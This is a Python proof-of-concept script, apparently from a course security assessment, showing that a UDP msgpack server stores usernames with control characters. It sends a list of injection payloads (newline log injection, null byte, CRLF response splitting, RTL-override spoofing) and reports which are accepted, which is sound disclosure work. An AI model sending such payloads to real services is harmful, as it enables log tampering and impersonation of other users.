"""
VULN-02: Username accepts control characters and injection strings
==================================================================
After the required 'clear-' prefix the server applies no further content
validation. Control characters, null bytes, and Unicode direction-override
characters are accepted and stored verbatim.

Impact demonstrated:
  1. Log injection  — newline in username corrupts server logs
  2. Null byte      — systems treating strings as C-style see a shorter name
  3. Display spoof  — RTL override makes the name render backwards in terminals,
                      so 'clear-‮admin' displays as 'clear-nimda' reversed,
                      potentially impersonating other users visually

Run: uv run python vulnerabilities/poc_02_username_injection.py
"""
import socket, msgpack, random, time

HOST, PORT = 'csc4026z.link', 51825

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(5.0)
    s.connect((HOST, PORT))
    h = random.randrange(1, 2**32)
    s.send(msgpack.packb({'request_type': 1, 'request_handle': h}))
    r = msgpack.unpackb(s.recv(4096), raw=True)
    return s, r[b'session']

def req(s, msg):
    s.send(msgpack.packb(msg))
    try:
        return msgpack.unpackb(s.recv(4096), raw=True)
    except socket.timeout:
        return None

def h():
    return random.randrange(1, 2**32)


PAYLOADS = [
    ('clear-line1\nINJECTED_LOG_LINE',  'newline — log injection'),
    ('clear-test\x00shadow',            'null byte — C-string truncation'),
    ('clear-\r\nHTTP/1.1 200 OK',       'CRLF injection'),
    ('clear-‮admin',               'RTL override — display spoofing'),
    ('clear-\t',                        'tab character'),
]

def main():
    sock, session = connect()
    print('Testing username content injection:\n')

    accepted = []
    for username, label in PAYLOADS:
        r = req(sock, {
            'request_type': 13, 'session': session,
            'request_handle': h(), 'username': username
        })
        success = r and r.get(b'response_type') == 34
        stored  = r.get(b'new_username', b'').decode(errors='replace') if r else ''
        status  = 'ACCEPTED' if success else 'REJECTED'
        print(f'  [{status}] {label}')
        if success:
            print(f'           sent   : {repr(username)}')
            print(f'           stored : {repr(stored)}')
            accepted.append((username, label, stored))
        time.sleep(0.2)

    sock.close()

    print(f'\n{"="*60}')
    print(f'VULNERABLE: {len(accepted)}/{len(PAYLOADS)} injection strings accepted\n')

    # Highlight the RTL display spoof
    rtl = next(((u, l, s) for u, l, s in accepted if 'RTL' in l), None)
    if rtl:
        username, _, stored = rtl
        print(f'Display spoofing demo:')
        print(f'  Stored bytes : {repr(username)}')
        print(f'  Terminal sees: {username}')
        print(f'  (text after U+202E renders right-to-left in most terminals)')
        print(f'  A user named "clear-‮admin" could look like "clear-nimda"')


if __name__ == '__main__':
    main()
